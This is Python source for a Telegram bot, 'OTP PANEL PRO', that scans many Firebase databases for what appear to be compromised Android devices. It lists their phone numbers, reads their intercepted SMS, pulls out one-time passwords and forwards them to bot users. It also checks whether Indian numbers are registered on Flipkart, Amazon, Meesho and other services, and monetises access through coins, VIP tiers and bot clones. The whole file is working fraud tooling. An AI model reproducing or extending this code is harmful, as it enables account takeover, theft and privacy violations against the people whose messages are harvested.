def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile", "number"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
    return list(set(nums))

def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"\b([A-Z0-9]{5,8})\b", re.IGNORECASE), re.compile(r"\b(\d{6})\b"), re.compile(r"\b(\d{4})\b")]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(str(text))
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

# 🔥 FIXED: Safe Timestamp parser so bot doesn't crash on bad database data
def safe_ts(val) -> int:
    try:
        if not val: return 0
        val = float(val)
        if val > 1e11: val = val / 1000
        return int(val)
    except: return 0

# 🔥 FIXED: Freshness logic strictly ignores numbers older than 12 hours
def is_recently_active(ts) -> bool:
    try:
        if not ts: return False
        val = float(ts)
        if val > 1e11: val = val / 1000  
        now = time.time()
        return (now - val) < 43200  # 12 Hours max
    except: return False

def get_status(status_str, ts) -> str:
    try:
        if ts:
            val = float(ts)
            if val > 1e11: val = val / 1000
            now = time.time()
            if (now - val) < 43200: return "online"
            else: return "offline"
    except: pass
    
    if status_str is not None:
        return "online" if str(status_str).lower() == "online" else "offline"
    return "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try: ts = float(sms["timestamp"]); return datetime.fromtimestamp(ts / 1000 if ts > 1e11 else ts).strftime("%d %b %Y %I:%M:%S %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
def user_display(info: dict) -> str: return f"{info.get('name', 'Unknown')} (@{info.get('username')})" if info.get("username") else info.get("name", "Unknown")

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err_str = str(context.error)
    if isinstance(context.error, (NetworkError, TimedOut, RetryAfter)): return
    if re.search(r"-?\d{8,}", err_str): return 
    tlog(f"Telegram API Error: {context.error}")

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        connector = TCPConnector(limit=150, limit_per_host=30, ttl_dns_cache=600, ssl=ssl_context, enable_cleanup_closed=True)
        timeout = ClientTimeout(total=10, connect=5, sock_read=8)
        _http_session = ClientSession(connector=connector, timeout=timeout, trust_env=True, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Connection": "keep-alive"})
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json"
        for _ in range(2):
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json(content_type=None)
                        return data if isinstance(data, dict) else None
                    elif response.status in [404, 403]: return None
                    else: await asyncio.sleep(0.5); continue
            except: await asyncio.sleep(0.5); continue
        return None
    except: return None

# ══════════════════════════════════════════════════════════════════
#  LIMIT SYSTEM & PENALTY TRACKING
# ══════════════════════════════════════════════════════════════════

def check_user_limit(chat_id: int) -> Tuple[bool, str]:
    if is_root_admin(chat_id): return True, ""
    u = all_users.get(chat_id, {})
    if time.time() < u.get("vip_until", 0): return True, ""
        
    lock_time = u.get("unreg_lock_time", 0.0)
    if time.time() - lock_time < 86400:
        left = int(86400 - (time.time() - lock_time))
        h, m = left // 3600, (left % 3600) // 60
        avail_refs = u.get("referrals", 0) - u.get("spent_refs", 0)
        msg = f"🚫 <b>LIMIT REACHED!</b>\nAapko 1 UNREGISTERED number mil chuka hai.\n\nAapko agle free check ke liye <b>{h}h {m}m</b> wait karna hoga.\n\n💡 <b>Bypass Lock:</b> 15 doston ko refer karein aur 1 Hour Unlimited VIP payein!\n\nYour Available Referrals: {avail_refs}/15\nYour Link: https://t.me/{BOT_USERNAME}?start={chat_id}"
        return False, msg
    return True, ""

def trigger_limit_if_unregistered(chat_id: int, is_reg: bool, is_error: bool):
    if not is_reg and not is_error and not is_root_admin(chat_id):
        u = all_users.get(chat_id, {})
        if time.time() > u.get("vip_until", 0):
            all_users[chat_id]["unreg_lock_time"] = time.time()

async def track_joins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = update.chat_member
    if not result: return
    chat_username = result.chat.username
    if not chat_username or chat_username.lower() not in [c['username'].lower() for c in REQUIRED_CHANNELS]: return

    new_status = result.new_chat_member.status
    user_id = result.from_user.id
    
    if new_status in ["left", "kicked"]:
        user_data = all_users.get(user_id)
        if not user_data: return
        
        joined_at = user_data.get("joined_at_ts", 0)
        ref_id = user_data.get("referred_by")
        
        if ref_id and (time.time() - joined_at) <= 86400:
            all_users[user_id]["coins"] = all_users[user_id].get("coins", 0) - 100
            all_users[user_id]["referred_by"] = None
            all_users[user_id]["verified"] = False
            
            if ref_id in all_users:
                all_users[ref_id]["coins"] = all_users[ref_id].get("coins", 0) - 100
                all_users[ref_id]["referrals"] = max(0, all_users[ref_id].get("referrals", 0) - 1)
                all_users[ref_id]["vip_until"] = 0.0 
                try: await context.bot.send_message(ref_id, "🚨 <b>HEAVY PENALTY IMPOSED!</b>\n\nAapne jis user ko invite kiya tha, usne 24 ghante pure hone se pehle channel chhod diya hai. Is wajah se aapko <b>100 Coins ki penalty lagi hai aur 1 Referral cut gaya hai!</b> Aapka VIP Access bhi revoke kar diya gaya hai.", parse_mode='HTML')
                except: pass
                
            try: await context.bot.send_message(user_id, "🚨 <b>HEAVY PENALTY IMPOSED! (-100 Coins)</b>\n\nAapne join karne ke 24 ghante ke andar hi channel left kar diya. Aapko invite karne wale ko aur aapko penalty lagi hai.", parse_mode='HTML')
            except: pass

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    if bot_token != TOKEN: return []
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=f"@{ch['username']}", user_id=user_id)
            if "left" in str(member.status).lower() or "kicked" in str(member.status).lower() or "banned" in str(member.status).lower():
                not_joined.append(ch["username"])
        except: not_joined.append(ch["username"])
    return not_joined

async def send_join_prompt(update: Update, is_main_bot: bool) -> None:
    buttons = [[InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"])] for ch in REQUIRED_CHANNELS]
    buttons.append([InlineKeyboardButton("✅ I Have Joined — Check Now", callback_data="check_join")])
    text = "🔒 <b>Verification Required</b>\n\nBot use karne ke liye neeche diye gaye sabhi channels join karna hoga:\n(Agar baad me leave kiya toh -100 Coins penalty lagegi!)\n\n"
    for ch in REQUIRED_CHANNELS: text += f"• {ch['name']}\n"
    if hasattr(update, 'effective_message') and update.effective_message:
        await update.effective_message.reply_text(text, reply_markup=InlineKeyboardMarkup(buttons), disable_web_page_preview=True, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
#  API CHECKER ENGINE
# ══════════════════════════════════════════════════════════════════

async def check_number_api(service: str, number: str) -> dict:
    clean_number = re.sub(r"\D", "", str(number))[-10:]
    api_keys = SYS_SETTINGS.get("api_keys", [])
    if not api_keys: return {"status": "error", "message": "No API Keys configured.", "ms": 0}

    selected_key = None; wait_time = 0.0
    async with API_LOCK:
        if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
        selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
        check_number_api.k_idx += 1
        now = time.time(); last_use = API_KEYS_STATE.get(selected_key, 0.0); diff = now - last_use
        if diff < 5.2: wait_time = 5.2 - diff; API_KEYS_STATE[selected_key] = now + wait_time
        else: wait_time = 0.0; API_KEYS_STATE[selected_key] = now

    if wait_time > 0: await asyncio.sleep(wait_time)
    payload = {"service": service.lower(), "number": clean_number}
    start_req = time.time()
    try:
        session = await get_http_session()
        async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=ClientTimeout(total=8)) as r:
            req_ms = int((time.time() - start_req) * 1000)
            if r.status == 200: 
                res = await r.json()
                res["ms"] = req_ms
                return res
            else: return {"status": "error", "message": f"HTTP {r.status}", "ms": req_ms}
    except Exception: return {"status": "error", "message": f"Timeout", "ms": int((time.time() - start_req) * 1000)}

# ══════════════════════════════════════════════════════════════════
#  FIREBASE DATA FETCHER - VERY AGGRESSIVE
# ══════════════════════════════════════════════════════════════════

async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
    async with SCAN_SEMAPHORE:  
        devices_list, added_set = [], set()
        try:
            sim_all, device_info_all, user_data_all, clients_all, devices_all, users_all = await asyncio.gather(
                fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
                fb_get("user_data", url), fb_get("clients", url), fb_get("Devices", url), fb_get("Users", url), return_exceptions=True
            )

            if isinstance(sim_all, dict):
                info_all = device_info_all if isinstance(device_info_all, dict) else {}
                for dev_id, sim in sim_all.items():
                    if dev_id in added_set or not isinstance(sim, dict): continue
                    added_set.add(dev_id)
                    info = info_all.get(dev_id) or {}
                    nums = extract_all_nums(sim, info)
                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                    ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
                    
                    devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

            if isinstance(user_data_all, dict):
                for dev_id, data in user_data_all.items():
                    if dev_id in added_set or not isinstance(data, dict): continue
                    added_set.add(dev_id)
                    nums = extract_all_nums(data)
                    ts = data.get("timestamp")
                    
                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))

            if isinstance(clients_all, dict):
                for dev_id, client in clients_all.items():
                    if dev_id in added_set or not isinstance(client, dict): continue
                    sim_list = client.get("sims", [])
                    nums = extract_all_nums(client, sim_list[0] if len(sim_list)>0 else {}, sim_list[1] if len(sim_list)>1 else {})
                    if not nums and not client.get("modelName"): continue
                    added_set.add(dev_id)
                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
                    status = "online" if client.get("status") is True else "offline"
                    
                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
                    
            if isinstance(devices_all, dict):
                for dev_id, data in devices_all.items():
                    if dev_id in added_set or not isinstance(data, dict): continue
                    added_set.add(dev_id)
                    nums = extract_all_nums(data)
                    model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
                    ts = data.get("timestamp")
                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))

            if isinstance(users_all, dict):
                for dev_id, data in users_all.items():
                    if dev_id in added_set or not isinstance(data, dict): continue
                    added_set.add(dev_id)
                    nums = extract_all_nums(data)
                    model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
                    ts = data.get("timestamp")
                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))

        except: pass
        return tag, devices_list

async def fetch_all_databases() -> Dict[str, List[Device]]:
    tasks = [fetch_single_db(tag, url) for tag, url in DATABASES.items()]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return {tag: devices for result in results if isinstance(result, tuple) for tag, devices in [result]}

async def get_all_devices(bot_token: str) -> list[Device]:
    devices = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
    unique_devices, seen_ids, seen_numbers = [], set(), set()
    for d in devices:
        if d.id in seen_ids: continue
        seen_ids.add(d.id)
        if d.numbers:
            new_nums = [n for n in d.numbers if n not in seen_numbers]
            if not new_nums: continue 
            d.numbers = new_nums
            seen_numbers.update(new_nums)
        unique_devices.append(d)

    online_devices = [d for d in unique_devices if d.status == "online"]
    online_devices.sort(key=lambda d: (0 if len(d.numbers) > 0 else 1, -d.timestamp))
    return online_devices

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: safe_ts(s.get("timestamp")), reverse=True)
    return entries[:limit]

# ══════════════════════════════════════════════════════════════════
#  BOT CLONE ENGINE
# ══════════════════════════════════════════════════════════════════

async def start_clone_bot(clone_token: str):
    app = Application.builder().token(clone_token).connection_pool_size(100).pool_timeout(60.0).connect_timeout(30.0).read_timeout(30.0).write_timeout(30.0).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("check", cmd_check_group))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)
    await app.initialize(); await app.start(); await app.updater.start_polling(drop_pending_updates=True)
    return app

# ══════════════════════════════════════════════════════════════════
#  MESSAGE BUILDERS
# ══════════════════════════════════════════════════════════════════

def get_reply_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
    keys = [
        [KeyboardButton("📱 Online Devices"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("🔑 Recent OTPs"), KeyboardButton("🕵️‍♂️ Number Checker")],
        [KeyboardButton("🔥 Auto Global DB"), KeyboardButton("🔥 Auto My DB")],
        [KeyboardButton("➕ Add My Panel"), KeyboardButton("🏆 Leaderboard")],
    ]
    if bot_token == TOKEN:
        bots_created = all_users.get(chat_id, {}).get("bots_created", 0) if chat_id else 0
        keys.append([KeyboardButton("👑 Buy VIP (20 Coins)"), KeyboardButton("🎁 Invite (1H VIP)")])
        keys.append([KeyboardButton(f"🤖 Create Your Bot ({20 + (bots_created * 10)} Coins)"), KeyboardButton("👤 My Profile")])
    else:
        keys.append([KeyboardButton("👤 My Profile")])
        
    keys.append([KeyboardButton("💬 Support Group")])
    if is_admin: keys.append([KeyboardButton("🛡 Admin Panel"), KeyboardButton("📊 Bot Status")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def get_checker_menu(prefix="chk_srv:", is_auto_fb=False):
    kb = [
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("👗 Shein", callback_data=f"{prefix}shein"), InlineKeyboardButton("👚 Myntra", callback_data=f"{prefix}myntra"), InlineKeyboardButton("🏨 Oyo", callback_data=f"{prefix}oyo")],
        [InlineKeyboardButton("🏢 Mantrimall", callback_data=f"{prefix}mantrimall"), InlineKeyboardButton("🟡 Blinkit", callback_data=f"{prefix}blinkit")],
        [InlineKeyboardButton("🛏️ Brevistay", callback_data=f"{prefix}brevistay"), InlineKeyboardButton("⚡ Ajio", callback_data=f"{prefix}ajio"), InlineKeyboardButton("📦 Amazon", callback_data=f"{prefix}amazon")],
        [InlineKeyboardButton("📱 MyJio", callback_data=f"{prefix}myjio"), InlineKeyboardButton("👓 Lenskart", callback_data=f"{prefix}lenskart")],
    ]
    if is_auto_fb or "auto" in prefix: kb.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(kb)

def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_error: bool = False, err_msg: str = ""):
    srv_name, emoji = service.capitalize(), "✨"
    for row in get_checker_menu().inline_keyboard:
        for btn in row:
            if service.lower() in btn.text.lower():
                parts = btn.text.split(" ")
                emoji, srv_name = parts[0], " ".join(parts[1:])
                break
    clean_num = re.sub(r"\D", "", str(number))[-10:]
    masked_num = f"+91{clean_num[:2]}****{clean_num[-1]}"
    if is_error: return f"⚠️ <b>ERROR</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {masked_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
    return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {masked_num}\n⚡ {ms} ms"

def device_label(d: Device) -> str: return " & ".join(d.numbers) if d.numbers else f"{d.name}"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    total_devices = sum(len(devs) for tag, devs in GLOBAL_DEVICE_CACHE.items())
    online_count = sum(1 for d in devices if d.status == "online")
    return f"✨ OTP PANEL PRO ✨\n━━━━━━━━━━━━━━━━━━\n🟢 Online: {online_count}   🔴 Offline: {total_devices - online_count}\n📱 Total Devices: {total_devices}\n📄 Showing Online: {len(devices)} | Page {page + 1} of {max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)}\n━━━━━━━━━━━━━━━━━━\nSelect an ONLINE number below:"

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}" if d.numbers else f"🟢 ⚙️ [{d.db_tag}] {d.name[:15]}", callback_data=f"sel:{d.id}")] for d in devices[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]]
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav); rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date, sim, sender = sms_date(sms), sms.get("sim_number") or "", sms.get("sender") or "Unknown"
    lines = [f"🔑 OTP: <code>{otp}</code>"] if otp else []
    lines.extend([f"👤 From: {sender}\n📅 Date: {date}", f"📡 SIM: {sim}" if sim else "", f"📱 Number: {num_label}\n\n💬 Message: {body}"])
    return "\n".join(filter(None, lines)), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp, date, sim, sender = extract_otp(body), sms_date(sms), sms.get("sim_number") or "", sms.get("sender") or "Unknown"
    if otp: return f"✨ NEW OTP RECEIVED ✨\n━━━━━━━━━━━━━━━━━━\n│ 🔢 OTP : <code>{otp}</code>\n│ 📱 Number : {num_label}\n│ 👤 From : {sender}\n│ 📅 Date : {date}\n{f'│ 📡 SIM : {sim}' if sim else ''}\n━━━━━━━━━━━━━━━━━━\n💬 {body}"
    return f"📩 NEW SMS RECEIVED\n━━━━━━━━━━━━━━━━━━\n📱 Number : {num_label}\n👤 From : {sender}\n📅 Date : {date}\n━━━━━━━━━━━━━━━━━━\n💬 {body}"

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES[bot_token]["users"]
    text = f"🛡 ADMIN PANEL\n━━━━━━━━━━━━━━━━━━\n👥 Total Users    : {len(users_db)}\n✅ Verified Users : {sum(1 for u in users_db.values() if u.get('verified'))}\n🏆 Total OTP Views: {sum(u.get('otp_count', 0) for u in users_db.values())}\n\n📊 API CHECKER STATS:\nTotal Checks: {SYS_SETTINGS['stats']['total_checks']}\nSuccess: {SYS_SETTINGS['stats']['success']} | Failed: {SYS_SETTINGS['stats']['failed']}\n"
    if bot_token == TOKEN: text += f"\n🤖 Cloned Bots    : {len(CLONES)}\n🗄 Active DBs    : {len([d for d in GLOBAL_DEVICE_CACHE if GLOBAL_DEVICE_CACHE[d]])}\n"
    return text + f"━━━━━━━━━━━━━━━━━━\n🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("👥 User List", callback_data="admin_users")], 
        [InlineKeyboardButton("🎁 Gift Coins All", callback_data="admin_gift_coins"), InlineKeyboardButton("🎁 Gift VIP (Time)", callback_data="admin_gift_vip")],
        [InlineKeyboardButton("➕ Add Firebase", callback_data="admin_add_firebase"), InlineKeyboardButton("🔑 API Keys", callback_data="admin_api_mgmt")],
        [InlineKeyboardButton("🗑 Remove API Key", callback_data="adm_del_key"), InlineKeyboardButton("🔎 Checker Mgmt", callback_data="admin_chk_mgmt")],
        [InlineKeyboardButton("🔐 Panel Locks", callback_data="admin_panellock:0")]
    ]
    if bot_token != TOKEN: keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL", callback_data="add_custom_db")])
    keys.append([InlineKeyboardButton("🚧 Maintenance Mode", callback_data="admin_maint"), InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh")])
    keys.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(keys)

def get_panel_lock_keyboard(page: int):
    unlocked = SYS_SETTINGS.get("unlocked_panels", [])
    all_tags = [f"DB_{i+1}" for i in range(len(RAW_URLS))]
    total_pages = max(1, (len(all_tags) + 29) // 30)
    page = max(0, min(page, total_pages - 1))
    
    kb = []
    row = []
    for tag in all_tags[page * 30 : (page + 1) * 30]:
        status = "🔓" if tag in unlocked else "🔒"
        row.append(InlineKeyboardButton(f"{status} {tag}", callback_data=f"tgl_pnl:{tag}:{page}"))
        if len(row) == 3:
            kb.append(row)
            row = []
    if row: kb.append(row)
    
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"admin_panellock:{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"admin_panellock:{page+1}"))
    kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_refresh")])
    return InlineKeyboardMarkup(kb)

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML"):
    try: await query.edit_message_text(text.replace("#", "&#35;") if parse_mode=="HTML" else text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=True)
    except Exception: pass

def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    return InlineKeyboardMarkup([[InlineKeyboardButton("💸 Referral Link", url=f"https://t.me/share/url?url={ref_link}&text=Try this premium OTP Panel Bot!")], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]])

# ══════════════════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.type != "private": return
    chat_id, user, bot_token = update.effective_chat.id, update.effective_user, ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    
    if not is_main_bot:
        if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: return await update.message.reply_text("Premium Expired.")
        users_db, is_admin = CLONES[bot_token]["users"], (chat_id == CLONES[bot_token]["creator"])
    else: users_db, is_admin = all_users, is_root_admin(chat_id)

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    if users_db.get(chat_id, {}).get("banned"): return await update.message.reply_text("🚫 You are banned.")

    ref_id = int(ctx.args[0]) if ctx.args and ctx.args[0].isdigit() else None
    
    if chat_id not in users_db:
        current_time = time.time()
        users_db[chat_id] = {
            "name": user.full_name if user else "Unknown", 
            "username": user.username or "", 
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), 
            "joined_at_ts": current_time,
            "verified": False, 
            "referrals": 0,
            "spent_refs": 0, 
            "coins": 0, 
            "vip_until": 0.0, 
            "otp_count": 0, 
            "bots_created": 0, 
            "bonus_10_received": False, 
            "referred_by": ref_id if ref_id != chat_id else None, 
            "banned": False, 
            "personal_dbs": [], 
            "group_check_time": 0.0
        }
        
        if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
            users_db[ref_id]["referrals"] += 1; users_db[ref_id]["coins"] += 10
            avail = users_db[ref_id]["referrals"] - users_db[ref_id].get("spent_refs", 0)
            try: await ctx.bot.send_message(ref_id, f"🎉 <b>SUCCESSFUL REFERRAL!</b>\n\nEk naye user ne aapke link se join kiya hai.\nCollect 15 referrals to get 1 Hour UNLIMITED VIP Access!\nYour Available Referrals: {avail}/15\n\n<i>⚠️ Note: Agar is user ne 24 ghante se pehle channel left kiya, toh dono ko penalty lagegi.</i>", parse_mode="HTML")
            except: pass

    if is_main_bot and not users_db.get(chat_id, {}).get("bonus_10_received"):
        users_db.setdefault(chat_id, {})["bonus_10_received"] = True
        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
        try: await ctx.bot.send_message(chat_id, "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\nAb sirf doston ko invite karo aur 1 Hour VIP ya khudka bot banao!\n\nClick '💸 Refer & Earn' to get your link.", parse_mode="HTML")
        except: pass

    unjoined = await check_membership(bot_token, ctx.bot, chat_id)
    if unjoined: return await send_join_prompt(update, is_main_bot)

    chats_registry.setdefault(bot_token, set()).add(chat_id)
    await update.message.reply_text(f"✨ OTP PANEL PRO EDITION ✨\n━━━━━━━━━━━━━━━━━━\nWelcome, {user.first_name}!\nSystem is connected and fully operational.\nUse the menu below to navigate.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id), parse_mode="HTML")

async def cmd_check_group(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id, user_id = update.effective_chat.id, update.effective_user.id
    if update.effective_chat.type == "private": return await update.message.reply_text("Use the '🕵️‍♂️ Number Checker' button in the menu.")
    
    users_db = all_users
    if user_id not in users_db: users_db[user_id] = {"group_check_time": 0.0}
    
    last_check = users_db[user_id].get("group_check_time", 0.0)
    if time.time() - last_check < 86400 and not is_root_admin(user_id):
        left = int(86400 - (time.time() - last_check))
        return await update.message.reply_text(f"⏳ <b>Group Cooldown!</b>\nYou can only check 1 number per 24 hours in group.\nWait {left // 3600}h {(left % 3600) // 60}m.", parse_mode="HTML")
        
    if len(ctx.args) != 2: return await update.message.reply_text("Usage: <code>/check meesho 9876543210</code>", parse_mode="HTML")
    service, number = ctx.args[0].lower(), re.sub(r"\D", "", ctx.args[1])
    if len(number) < 10: return await update.message.reply_text("❌ Invalid 10-digit Indian number.")
    number = number[-10:]
        
    wait_msg = await update.message.reply_text(f"⚡ Checking {number} on {service.upper()}...")
    res = await check_number_api(service, number)
    
    users_db[user_id]["group_check_time"] = time.time()
    
    if res.get("status") in ["success", "ok", True] or res.get("registered") is not None:
        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
        await wait_msg.edit_text(f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n✨ <b>{service.capitalize()}</b>\n📱 {number[:5]}****{number[-1]}\n⚡ {res.get('ms', 0)} ms", parse_mode="HTML")
    else: await wait_msg.edit_text(f"⚠️ <b>ERROR</b>\n\n✨ <b>{service.capitalize()}</b>\n📱 {number[:5]}****{number[-1]}\n⚡ {res.get('ms', 0)} ms\n\n<i>{res.get('message', 'Unknown')}</i>", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ══════════════════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    data, chat_id, bot_token = query.data or "", query.message.chat_id, ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    
    if not is_main_bot:
        if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: return
        users_db, is_admin = CLONES[bot_token]["users"], (chat_id == CLONES[bot_token]["creator"])
